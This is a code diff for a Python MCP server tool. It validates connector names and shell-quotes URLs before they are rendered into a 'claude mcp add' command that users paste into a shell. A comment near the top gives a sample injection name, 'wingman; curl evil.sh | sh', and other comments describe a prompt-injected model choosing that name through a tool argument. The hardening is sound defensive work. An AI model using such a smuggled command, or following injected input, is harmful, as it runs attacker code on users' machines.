@@ -24,7 +24,9 @@ import atexit
 import json
 import logging
 import os
+import re
 import secrets
+import shlex
 import socket
 import subprocess
 import sys
@@ -2835,6 +2837,42 @@ def _tunnel_port(cli_value: int | None = None, env: Mapping[str, str] | None = N
         return None
 
 
+# A connector name goes into a line whose entire purpose is that somebody
+# pastes it into a shell without reading it. That makes it the one string
+# here where "it is only for display" is exactly backwards: display IS
+# execution, one paste later.
+#
+# It arrives from an MCP tool argument (so a prompt-injected model can
+# choose it), a CLI flag, or 'wingman-<slug>' derived from the tenant
+# registry, whose slugs are only ever checked for being non-empty. A name
+# like 'wingman; curl evil.sh | sh' would render a command that runs a
+# second one.
+#
+# Claude Code's own connector names are a short identifier, so requiring
+# that costs nothing real and leaves no room for a metacharacter.
+_CONNECTOR_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]*$")
+
+
+class ConnectorNameError(ValueError):
+    """A connector name that must not be rendered into a paste-me command."""
+
+
+def validate_connector_name(name: str) -> str:
+    """Return 'name' if it can safely be pasted, else raise.
+
+    Refuses rather than sanitizing. A silently rewritten name produces a
+    command that works and registers a connector the caller did not ask
+    for, and two different bad names can sanitize to the same good one.
+    """
+    if not _CONNECTOR_NAME_RE.match(name):
+        raise ConnectorNameError(
+            f"connector name {name!r} is not usable: use letters, digits, dot, dash "
+            "or underscore, starting with a letter or digit. This name is rendered "
+            "into a 'claude mcp add' command meant to be pasted into a shell."
+        )
+    return name
+
+
 def connector_urls(
     token: str,
     extra_hosts: Sequence[str],
@@ -2879,10 +2917,20 @@ def connector_urls(
     prefix = normalize_prefix(prefix)
     tunnel_prefix = normalize_prefix(tunnel_prefix) or prefix
 
+    if connector_name:
+        validate_connector_name(connector_name)
+
     def _mcp_pair(label: str, url: str) -> list[tuple[str, str]]:
         pair = [(label, url)]
         if connector_name:
-            command = f"claude mcp add --transport http {connector_name} {url}"
+            # shlex.quote is a no-op for anything that needs no quoting, so
+            # an ordinary name and url render byte-identically to before.
+            # It earns its place on the url, whose host and prefix are not
+            # validated anywhere and reach here from a tunnel hostname or
+            # a --prefix flag.
+            command = (
+                f"claude mcp add --transport http {shlex.quote(connector_name)} {shlex.quote(url)}"
+            )
             pair.append(("Claude Code (paste this)", command))
         return pair
 
@@ -3125,16 +3173,22 @@ def tenant_url(
     except TenantRegistryError as exc:
         return f"Could not read the tenant registry ({registry_path}): {exc}"
     extra_hosts = _extra_allowed_hosts(None)
-    lines, _ok = render_tenant_urls(
-        tenants,
-        slug,
-        registry_path,
-        extra_hosts,
-        host=host,
-        port=port,
-        tunnel_prefix=tunnel_prefix,
-        connector_name=connector_name or f"wingman-{slug}",
-    )
+    try:
+        lines, _ok = render_tenant_urls(
+            tenants,
+            slug,
+            registry_path,
+            extra_hosts,
+            host=host,
+            port=port,
+            tunnel_prefix=tunnel_prefix,
+            connector_name=connector_name or f"wingman-{slug}",
+        )
+    except ConnectorNameError as exc:
+        # Reaches here from this tool's own argument -- which a model chooses,
+        # and a prompt-injected one chooses badly -- or from a registry slug,
+        # which nothing validates beyond being non-empty.
+        return f"Refusing to print a paste-me command: {exc}"
     return "\n".join(lines)
 
 
@@ -3190,16 +3244,19 @@ def tenant_urls(
     extra_hosts = _extra_allowed_hosts(None)
     slug = slug.strip()
     effective_name = (connector_name or f"wingman-{slug}") if slug else "wingman"
-    lines, _ok = render_tenant_urls(
-        tenants,
-        slug or None,
-        registry_path,
-        extra_hosts,
-        host=host,
-        port=port,
-        tunnel_prefix=tunnel_prefix,
-        connector_name=effective_name,
-    )
+    try:
+        lines, _ok = render_tenant_urls(
+            tenants,
+            slug or None,
+            registry_path,
+            extra_hosts,
+            host=host,
+            port=port,
+            tunnel_prefix=tunnel_prefix,
+            connector_name=effective_name,
+        )
+    except ConnectorNameError as exc:
+        return f"Refusing to print a paste-me command: {exc}"
     return "\n".join(lines)
 
 
